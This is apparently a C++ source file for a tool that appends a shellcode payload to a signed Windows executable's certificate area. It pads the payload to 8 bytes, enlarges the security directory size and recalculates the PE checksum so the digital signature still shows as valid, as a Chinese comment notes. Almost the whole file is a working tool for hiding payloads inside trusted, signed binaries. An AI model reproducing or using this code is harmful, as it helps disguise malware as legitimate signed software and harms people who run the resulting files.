#include <win.h>
#include <zip++.h>
#include <encryption.hpp>
#include "vrfcore.exe.zip.res.h"

bool Finish(const std::string& pe_buffer, const std::string& appenddata, std::string& outdata);

int main(int argc, char** argv) {
	std::map<std::string, std::string> input_parameters;
	std::string command_line;
	for (int i = 0; i < argc; ++i) {
		command_line.append(" ").append(argv[i]);
	}

	std::vector<std::string> parses;
	shared::Win::File::ParseA(command_line, ' ', parses);
	if (parses.size() < 2) {
		std::cout << "Invalid command line parameters." << std::endl;
		return -1;
	}

	for (const auto& node : parses) {
		std::vector<std::string> parse_node;
		shared::Win::File::ParseA(node, '=', parse_node);
		if (parse_node.size() != 2)
			continue;
		for (auto it = parse_node[0].begin(); it != parse_node[0].end();) {
			if (*it == ' ')
				it = parse_node[0].erase(it);
			else
				break;
		}
		input_parameters.emplace(shared::IConv::ToLowerA(parse_node[0]), shared::IConv::ToLowerA(parse_node[1]));
	}

	if (input_parameters.empty()) {
		std::cout << "Invalid command line parameters." << std::endl;
		return -1;
	}


	bool result = false;
	std::string pe_buffer;
	std::string append_data;
	std::string final_finish_buffer;
	DWORD AppendDataSize = 0;

	do {
		std::cout << std::format("load pe pathname is '{}'", input_parameters["--input-pe"]) << std::endl;
		pe_buffer = shared::Win::File::Read(input_parameters["--input-pe"]);
		std::cout << std::format("Read to pe file buffer size({}).", pe_buffer.size()) << std::endl;
		if (!pe_buffer.empty()) {
			if (!shared::Win::PE::Verify(pe_buffer)) {
				std::cout << std::format("{}", "PE file is invalid.") << std::endl;
				break;
			}
			/*if (!shared::Win::PE::IsX64(pe_buffer)) {
				std::cout << std::format("{}", "PE file is invalid.") << std::endl;
				break;
			}*/
		}
		else {
			std::string zip, unzip;
			pe_buffer = std::string((char*)&vrfcore_exe_zip_res[0], sizeof(vrfcore_exe_zip_res));
			zip = shared::Encryption::WemadeDecode(pe_buffer);
			shared::Zip::zipPakUnCompressFirstToBuffer(zip, unzip);
			if (unzip.empty())
				break;
			pe_buffer = unzip;
		}

		std::cout << std::format("input-shellcode is '{}'.", input_parameters["--input-shellcode"]) << std::endl;
		append_data = shared::Win::File::Read(input_parameters["--input-shellcode"]);
		AppendDataSize = static_cast<DWORD>(append_data.size());
		if (AppendDataSize <= 0) {
			std::cout << std::format("Append data invalid and size({}).", AppendDataSize) << std::endl;
			break;
		}
		if (!Finish(pe_buffer, append_data, final_finish_buffer)) {
			std::cout << std::format("Generate final data failed.") << std::endl;
			break;
		}
		::remove(input_parameters["--output"].c_str());
		if (!shared::Win::File::Write(input_parameters["--output"], final_finish_buffer)) {
			std::cout << std::format("Generate final file({}) failed.", input_parameters["--output"]) << std::endl;
			break;
		}
		result = true;
	} while (0);

	std::cout << std::format("Final result({}).", result ? "success" : "failed") << std::endl;
	return 0;
}

bool Finish(const std::string& host_pe_buffer, const std::string& append_data, std::string& outdata) {
	bool result = false;
	std::string final_appenddata{ append_data };
	do {//!@ ****** 对添加payload的长度限制做了修正，payload长度需要满足是8的倍数，否则数字签名状态无效(感谢维一零的帮助)
		const size_t shellcode_total_size = final_appenddata.size();
		auto remain = shellcode_total_size % 8ul;
		if (remain == 0)
			break;
		//!@ 0x00 补位
		final_appenddata.append(8ul - remain, 0x00);
		std::cout << std::format("Append data patch big({}).", 8ul - remain) << std::endl;
	} while (0);

	do {
		if (!shared::Win::PE::Verify(host_pe_buffer)) {
			std::cout << std::format("Invalid host pe.") << std::endl;
			break;
		}
		auto x64 = shared::Win::PE::IsX64(host_pe_buffer);
		std::cout << std::format("Host pe is({}) pe , and size({}).", x64 ? "x64" : "x86", host_pe_buffer.size()) << std::endl;
		outdata = host_pe_buffer;
		DWORD HeaderSum = 0;
		DWORD CheckSum = 0;
		if (x64) {
			char* pBegin = const_cast<char*>(outdata.data());
			IMAGE_DOS_HEADER* pDocHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(outdata.data());
			IMAGE_NT_HEADERS64* pNtHeader = reinterpret_cast<IMAGE_NT_HEADERS64*>(pBegin + pDocHeader->e_lfanew);
			IMAGE_OPTIONAL_HEADER64 image_optional_header = { 0 };
			::memcpy(&image_optional_header, &pNtHeader->OptionalHeader, sizeof(image_optional_header));
			image_optional_header.DataDirectory[4].Size += static_cast<DWORD>(final_appenddata.size());
			::memcpy(&pNtHeader->OptionalHeader, &image_optional_header, sizeof(pNtHeader->OptionalHeader));
			::CheckSumMappedFile((PVOID)outdata.data(), static_cast<DWORD>(outdata.size()), &HeaderSum, &CheckSum);
			if (HeaderSum != CheckSum) {
				image_optional_header.CheckSum = CheckSum;
				::memcpy(&pNtHeader->OptionalHeader, &image_optional_header, sizeof(pNtHeader->OptionalHeader));
			}
		}
		else {
			char* pBegin = const_cast<char*>(outdata.data());
			IMAGE_DOS_HEADER* pDocHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(outdata.data());
			IMAGE_NT_HEADERS32* pNtHeader = reinterpret_cast<IMAGE_NT_HEADERS32*>(pBegin + pDocHeader->e_lfanew);
			IMAGE_OPTIONAL_HEADER32 image_optional_header = { 0 };
			::memcpy(&image_optional_header, &pNtHeader->OptionalHeader, sizeof(image_optional_header));
			image_optional_header.DataDirectory[4].Size += static_cast<DWORD>(final_appenddata.size());
			::memcpy(&pNtHeader->OptionalHeader, &image_optional_header, sizeof(pNtHeader->OptionalHeader));
			::CheckSumMappedFile((PVOID)outdata.data(), static_cast<DWORD>(outdata.size()), &HeaderSum, &CheckSum);
			if (HeaderSum != CheckSum) {
				image_optional_header.CheckSum = CheckSum;
				::memcpy(&pNtHeader->OptionalHeader, &image_optional_header, sizeof(pNtHeader->OptionalHeader));
			}
		}
		std::cout << std::format("HeaderSum({}) and CheckSum({}).", HeaderSum, CheckSum) << std::endl;
		outdata.append(final_appenddata);
		result = true;
	} while (0);
	std::cout << std::format("Generate ({}) out data size({}).", result ? "success" : "failed", outdata.size());
	return result;
}